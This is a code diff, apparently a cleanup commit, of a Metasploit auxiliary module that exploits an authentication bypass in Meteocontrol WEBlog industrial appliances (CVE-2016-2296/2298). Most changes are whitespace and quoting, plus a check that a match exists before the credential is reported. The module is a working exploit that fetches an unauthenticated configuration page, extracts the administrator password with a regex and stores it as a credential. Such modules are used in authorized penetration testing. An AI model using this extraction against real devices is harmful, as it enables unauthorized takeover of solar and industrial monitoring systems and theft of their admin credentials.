@@ -13,21 +13,21 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info={})
     super(update_info(info,
-      'Name'        => 'Meteocontrol WEBlog Password Extractor',
+      'Name' => 'Meteocontrol WEBlog Password Extractor',
       'Description' => %{
           This module exploits an authentication bypass vulnerability in Meteocontrol WEBLog appliances (software version < May 2016 release) to extract Administrator password for the device management portal.
       },
-      'References'  =>
+      'References' => 
         [
           ['URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-16-133-01'],
           ['CVE', '2016-2296'],
           ['CVE', '2016-2298']
         ],
-      'Author'         =>
+      'Author' =>
         [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'License'        => MSF_LICENSE))
+      'License' => MSF_LICENSE))
 
     register_options(
       [
@@ -51,8 +51,8 @@ class MetasploitModule < Msf::Auxiliary
   def is_app_metweblog?
     begin
       res = send_request_cgi({
-        'uri'     => '/html/en/index.html',
-        'method'  => 'GET'
+        'uri' => '/html/en/index.html',
+        'method' => 'GET'
       })
 
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
@@ -60,7 +60,7 @@ class MetasploitModule < Msf::Auxiliary
       return false
     end
 
-    if (res && res.code == 200 && (res.headers['Server'] && res.headers['Server'].include?("IS2 Web Server") || res.body.include?("WEB'log")))
+    if (res && res.code == 200 && (res.headers['Server'] && res.headers['Server'].include?('IS2 Web Server') || res.body.include?("WEB'log")))
       print_good("#{rhost}:#{rport} - Running Meteocontrol WEBlog management portal...")
       return true
     else
@@ -74,12 +74,11 @@ class MetasploitModule < Msf::Auxiliary
   #
 
   def do_extract()
-
     print_status("#{rhost}:#{rport} - Attempting to extract Administrator password...")
     begin
       res = send_request_cgi({
-          'uri'       => '/html/en/confAccessProt.html',
-          'method'    => 'GET'
+          'uri' => '/html/en/confAccessProt.html',
+          'method' => 'GET'
       })
 
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
@@ -87,20 +86,24 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    if (res && res.code == 200 && (res.body.include?("szWebAdminPassword") || res.body=~ /Admin Monitoring/))
+    if (res && res.code == 200 && (res.body.include?('szWebAdminPassword') || res.body=~ /Admin Monitoring/))
       get_admin_password = res.body.match(/name="szWebAdminPassword" value="(.*?)"/)
-      admin_password = get_admin_password[1]
-      print_good("#{rhost}:#{rport} - Password is #{admin_password}")
-      report_cred(
-        ip: rhost,
-        port: rport,
-        service_name: 'Meteocontrol WEBlog Management Portal',
-        password: admin_password,
-        proof: res.body
-      )
+      if get_admin_password[1]
+        admin_password = get_admin_password[1]
+        print_good("#{rhost}:#{rport} - Password is #{admin_password}")
+        report_cred(
+          ip: rhost,
+          port: rport,
+          service_name: 'Meteocontrol WEBlog Management Portal',
+          password: admin_password,
+          proof: res.body
+        )
+      else
+        # In some models, 'Website password' page is renamed or not present. Therefore, password can not be extracted. Check login manually on http://IP:port/html/en/confAccessProt.html for the szWebAdminPassword field's value.
+        print_error("Check login manually on http://#{rhost}:#{rport}/html/en/confAccessProt.html for the 'szWebAdminPassword' field's value.")
+      end
     else
-      # In some models, 'Website password' page is renamed or not present. Therefore, password can not be extracted. Try login manually in such cases.
-      print_error("Password not found. Check login manually.")
+      print_error("Check login manually on http://#{rhost}:#{rport}/html/en/confAccessProt.html for the 'szWebAdminPassword' field's value.")
     end
   end
 
